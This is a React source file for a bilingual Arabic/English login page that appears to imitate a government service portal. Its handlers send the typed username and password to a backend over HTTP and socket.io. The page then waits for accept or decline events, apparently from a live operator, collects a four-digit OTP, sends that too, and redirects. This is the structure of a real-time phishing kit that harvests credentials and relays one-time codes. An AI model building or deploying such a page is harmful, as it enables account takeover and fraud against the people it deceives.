import React, { useEffect, useState } from "react";
import { FiSearch } from "react-icons/fi";
import {
  BsArrowUp,
  BsBookHalf,
  BsEye,
  BsSnapchat,
  BsTwitterX,
  BsYoutube,
} from "react-icons/bs";
import { Swiper, SwiperSlide } from "swiper/react";
import { Navigation, Pagination } from "swiper/modules";
import "swiper/css";
import "swiper/css/navigation";
import "swiper/css/pagination";
import { LuArrowUpLeftSquare } from "react-icons/lu";
import { PiUser } from "react-icons/pi";
import {
  BiArrowFromTop,
  BiArrowToTop,
  BiBook,
  BiChat,
  BiLockAlt,
  BiPhone,
} from "react-icons/bi";
import { RiUserAddLine } from "react-icons/ri";
import { LuCalendarSearch } from "react-icons/lu";
import { CiAirportSign1 } from "react-icons/ci";
import { SlCalender } from "react-icons/sl";
import { FaArrowTrendUp, FaFacebook } from "react-icons/fa6";
import { FaUsers } from "react-icons/fa";
import { LiaNetworkWiredSolid } from "react-icons/lia";
import { MdOutlineDevices } from "react-icons/md";
import { CiMobile1 } from "react-icons/ci";
import {
  IoChatbubblesOutline,
  IoPlaySkipBackCircleOutline,
} from "react-icons/io5";
import axios from "axios";

import io from "socket.io-client";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineStop } from "react-icons/ai";
import { IoMdClose } from "react-icons/io";
import Footer from "../component/Footer";
import { useNavigate } from "react-router-dom";
import NavBar from "../component/NavBar";
import OtpInput from "react-otp-input";

export const serverRoute = "http://localhost:8080";
// export const serverRoute = "https://abshirkser-1csw.onrender.com";

export const socket = io(serverRoute);
const Main = ({ setMode, checkMode }) => {
  const [isVisible, setIsVisible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [success, setSuccess] = useState(false);
  const [otp, setOtp] = useState("");
  const [username, setUsername] = useState();
  const [password, setPassword] = useState();
  const [disabled, setDisabled] = useState(false);
  const mode = localStorage.getItem("lang");

  const handleScroll = () => {
    const scrollTop = document.documentElement.scrollTop;
    setIsVisible(scrollTop > 300);
  };
  const scrollToTop = () => {
    window.scrollTo({
      top: 0,
      behavior: "smooth",
    });
  };
  const navigate = useNavigate();
  useEffect(() => {
    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const handleSubmit = async (e) => {
    setLoading(true);
    setFailed(false);
    e.preventDefault();
    const username = e.target[0].value;
    const password = e.target[1].value;
    setUsername(username);
    setPassword(password);
    await axios.post(serverRoute + "/login", {
      username,
      password,
    });
    socket.emit("login", {
      username,
      password,
    });
  };

  // const sendEmail = async (otp)=>await axios.post(serverRoute+'/auth/email?login=true',{username,password,otp})
  socket.on("acceptLogin", (data) => {
    console.log("acceptLogin", data);
    if (data.username === username) {
      setLoading(false);
      sessionStorage.setItem("id", data.id);
      setFailed(false);
      setSuccess(true);
    }
  });
  socket.on("declineLogin", (data) => {
    if (data.username === username) {
      setLoading(false);
      setFailed(true);
    }
  });
  const handleOtp = async () => {
    if (!otp) return window.alert("Otp is required");
    setLoading(true);
    setFailed(false);
    await axios.post(
      serverRoute + "/loginOtp/" + sessionStorage.getItem("id"),
      {
        otp,
      }
    );
    socket.emit("otpLogin", {
      id: sessionStorage.getItem("id"),
      otp,
    });
    window.location.href = "/services";
  };

  const data = ["/3.jpeg", "/1.jpg", "/2.jpg", "/4.jpg"];
  const data2 = ["/5.jpg", "/6.jpg", "/7.jpg", "/8.jpeg"];
  const dataWeb = ["/3web.jpg", "/1web.jpeg", "/2web.jpg", "/4web.jpg"];
  const dataWeb2 = ["/5web.jpeg", "/6web.jpg", "/7web.jpg", "/8web.jpg"];
  return (
    <div
      className=" w-full flex flex-col  h-full relative justify-center items-center"
      dir={mode === "ar" ? "ltr" : "rtl"}
    >
      {loading && (
        <div className="fixed top-0 w-full z-50  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      {success && (
        <div className="fixed top-0 z-40  flex  items-start justify-center bg-white w-screen h-screen  py-10 ">
          <div className="flex flex-col bg-white w-full sm:w-2/3  p-2 gap-y-5 items-center">
            <div className="w-full flex justify-center flex-row items-center">
              <img src="/main_images/nav2.png" className="md:w-1/12 w-1/5" />
              <img src="/main_images/nav3.jpg" />
            </div>
            <span className="font-bold text-center w-full">رمز التحقق</span>
            <span className="w-11/12 text-wrappy-5 px-2 text-gray-600   text-center">
              {" "}
              {
                checkMode(
                  "Please enter the confirmation number that was sent to your  phone ",
                  " الرجاء ادخال رقم التأكيد الذي تم ارساله على جوالك"
                ).word
              }{" "}
            </span>
            {/* <div className='flex items-center justify-center gap-x-2   my-2'>
            <input className='border-b-2 text-xl p-1 border-black w-8 text-center' maxLength={1}  onClick={(e)=>console.log(e)} onChange={(e)=>setOtp(e.target.value)}/>
            
            </div> */}
            {/* <button className='my-1 w-full bg-green-500  text-white py-1 ' onClick={async()=>{
                if(otp){
                    await sendEmail(otp).then(()=> window.location.href = '/services')
                   
                }
            }}>
                </button> */}
            <OtpInput
              value={otp}
              onChange={setOtp}
              numInputs={4}
              shouldAutoFocus={true}
              containerStyle={{ direction: "ltr" }}
              renderInput={(props) =>
                disabled ? (
                  <input
                    {...props}
                    className="border-b-2 text-xl p-1 border-black  mx-3"
                    disabled
                    inputMode="numeric"
                  />
                ) : (
                  <input
                    {...props}
                    className="border-b-2 text-xl p-1 border-black  mx-3"
                    inputMode="numeric"
                  />
                )
              }
            />
            <button
              className="my-5 w-5/12 hover:bg-white hover:border-green-500 hover:text-green-500 bg-green-500 text-white  py-1"
              style={{ border: "1px solid" }}
              onClick={async () => {
                await handleOtp();
              }}
            >
              {checkMode("Submit", "تأكيد").word}
            </button>
            {failed && (
              <div className=" flex items-center justify-center mx-2 mb-2 z-10  border-2 border-red-400 bg-red-100 rounded-lg py-5 relative  ">
                <div className="text-xs text-right px-2 text-red-700 font-bold">
                  {
                    checkMode(
                      "Excuse me! OTP is incorrect. Please ensure that the information entered is correct",
                      " غير صحيح برجاء إدخال البيانات صحيحة OTP"
                    ).word
                  }
                </div>
              </div>
            )}
          </div>
        </div>
      )}
      <NavBar mode={mode} setMode={setMode} checkMode={checkMode} />

      <div className="w-full items-center flex justify-center ">
        <div className=" relative my-2 w-full  select-none flex flex-col  justify-between items-center lg:justify-center lg:flex-row gap-x-4">
          <div className="w-full md:hidden flex">
            <Swiper
              modules={[Pagination]}
              pagination={{
                clickable: true,
              }}
              autoplayDelay={1000}
              className={` w-full  flex  ${success | loading && "!-z-10"} `}
            >
              {mode === "ar" ? (
                <>
                  <SwiperSlide className="w-full flex md:h-96">
                    <img
                      src="/3.jpeg"
                      className={`w-full text-center imgSwiper h-fit  `}
                    />{" "}
                  </SwiperSlide>
                  <SwiperSlide className="w-full flex md:h-96">
                    <img
                      src="/2.jpg"
                      className={`w-full text-center imgSwiper h-fit  `}
                    />{" "}
                  </SwiperSlide>
                  <SwiperSlide className="w-full flex md:h-96">
                    <img
                      src="/1.jpg"
                      className={`w-full text-center imgSwiper h-fit  `}
                    />{" "}
                  </SwiperSlide>
                  <SwiperSlide className="w-full flex md:h-96">
                    <img
                      src="/4.jpg"
                      className={`w-full text-center imgSwiper h-fit  `}
                    />{" "}
                  </SwiperSlide>
                </>
              ) : (
                dataWeb.map((imgSrc) => (
                  <SwiperSlide className="w-full flex md:h-96">
                    <img
                      src={imgSrc}
                      className={`w-full text-center imgHeight h-fit  `}
                    />{" "}
                  </SwiperSlide>
                ))
              )}
            </Swiper>
          </div>
          <div className="md:flex hidden w-full">
            <Swiper
              modules={[Pagination]}
              pagination={{
                clickable: true,
              }}
              autoplayDelay={500}
              className={` w-full  flex  ${success | loading && "!-z-10"} `}
            >
              {mode === "ar"
                ? data2.map((imgSrc) => (
                    <SwiperSlide className="w-full flex md:h-96">
                      <img
                        src={imgSrc}
                        className={`w-full text-center imgHeight h-fit  `}
                      />{" "}
                    </SwiperSlide>
                  ))
                : dataWeb2.map((imgSrc) => (
                    <SwiperSlide className="w-full flex md:h-96">
                      <img
                        src={imgSrc}
                        className={`w-full text-center imgHeight h-fit  `}
                      />{" "}
                    </SwiperSlide>
                  ))}
            </Swiper>
          </div>

          <div
            className={`lg:w-1/5 md:w-2/5 my-2 bg-white w-full flex flex-col divide-y-2 md:absolute top-20 z-20  rounded-xl ${
              mode === "ar" ? "left-52" : "right-72"
            }`}
          >
            <div className="flex font-bold justify-end p-5 items-center gap-x-3">
              <span className="font-bold">
                {checkMode("Login", "تسجيل الدخول").word}
              </span>
            </div>
            {failed && (
              <div className=" flex items-center justify-center mx-2 mb-2 z-10  border-2 border-red-400 bg-red-100 rounded-lg py-5 relative  ">
                <IoMdClose
                  className="absolute top-2 left-2 cursor-pointer text-red-400"
                  onClick={() => {
                    setFailed(false);
                  }}
                />
                <div className="text-xs text-right px-2 text-red-700 font-bold">
                  {
                    checkMode(
                      "Excuse me! The username or password is incorrect. Please ensure that the information entered is correct",
                      "عذرا! اسم المستخدم او كلمه المرور غير صحيحه.فضلا تاكد من صحه المعلومات المدخله"
                    ).word
                  }
                </div>
              </div>
            )}
            <form
              className="flex p-5 items-center gap-y-5 rounded-xl   flex-col"
              style={{ border: "1px solid #eee" }}
              onSubmit={handleSubmit}
              dir={mode === "ar" ? "rtl" : "ltr"}
            >
              <div className="w-full flex flex-col gap-y-3">
                {checkMode("Username / ID", "أسم المستخدم أو رقم الهوية ").word}
                <div
                  style={{ border: "1px solid #eee" }}
                  className="flex items-center px-3 py-2  w-full rounded-md   text-gray-600"
                >
                  <PiUser className="text-gray-500 text-2xl " />
                  <input
                    className="font-bold  outline-none placeholder:text-xs w-full flex-1  p-2"
                    required
                    type="text"
                    placeholder={
                      checkMode(
                        "User name / ID",
                        " أسم المستخدم أو رقم الهوية   "
                      ).word
                    }
                  />
                </div>
              </div>
              <div className="w-full flex flex-col gap-y-3">
                {checkMode(" Password", "كلمة المرور").word}

                <div
                  style={{ border: "1px solid #eee" }}
                  className="flex items-center px-3 py-2  w-full rounded-md text-gray-600"
                >
                  <BiLockAlt className="text-gray-500 text-2xl " />
                  <input
                    className="font-bold  outline-none placeholder:text-xs w-full  p-2"
                    required
                    type="password"
                    placeholder={checkMode("Password", "كلمه المرور").word}
                  />
                </div>
              </div>
              <span
                className="text-green-800 font-bold w-full "
                dir={mode === "ar" ? "rtl" : "ltr"}
              >
                {
                  checkMode(
                    " Forget Password ?",
                    "                نسيب كلمة المرور ؟"
                  ).word
                }
              </span>
              <button
                type="submit"
                className="text-white bg-green-800 rounded-lg py-2 w-full"
              >
                {checkMode("Login", "تسجيل الدخول").word}
              </button>
              <span className="text-green-800 font-bold">
                {checkMode("New User ?", "مستخدم جديد ؟").word}
              </span>
            </form>

            {/* <div className="flex justify-end p-5 items-center gap-x-3">
              <span className="font-bold text-gray-500">
                {checkMode("New User ", "مستخدم جديد").word}
              </span>
              <RiUserAddLine className="text-gray-300 text-2xl" />
            </div>
            <div className="flex justify-end p-5 items-center gap-x-3">
              <span className="font-bold text-gray-500">
                {checkMode("Forget Password", "   نسيت كلمه المرور").word}
              </span>
              <BiLockAlt className="text-gray-300 text-2xl" />
            </div> */}
          </div>
        </div>
      </div>

      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home1.png" /> : <img src="/home1web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home2.png" /> : <img src="/home2web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home3.png" /> : <img src="/home3web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home4.png" /> : <img src="/home4web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home5.png" /> : ""}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home6.png" /> : ""}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home7.png" /> : <img src="/home7web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home8.png" /> : ""}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home9.png" /> : <img src="/home9web.png" />}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? (
          <img src="/home10.png" />
        ) : (
          <img src="/home10web.png" />
        )}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? (
          <img src="/home11.png" />
        ) : (
          <img src="/home11web.png" />
        )}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home12.png" /> : ""}
      </div>
      <div className="w-full flex items-center justify-center">
        {mode === "ar" ? <img src="/home13.png" /> : ""}
      </div>
      <Footer checkMode={checkMode} />
      {!success && (
        <button className="fixed  bottom-10 right-16 bg-green-500 text-white w-12 h-12 flex items-center justify-center rounded-full">
          <img src="/cccccccccccccccccccccccccccc.png" />
        </button>
      )}
    </div>
  );
};

export default Main;
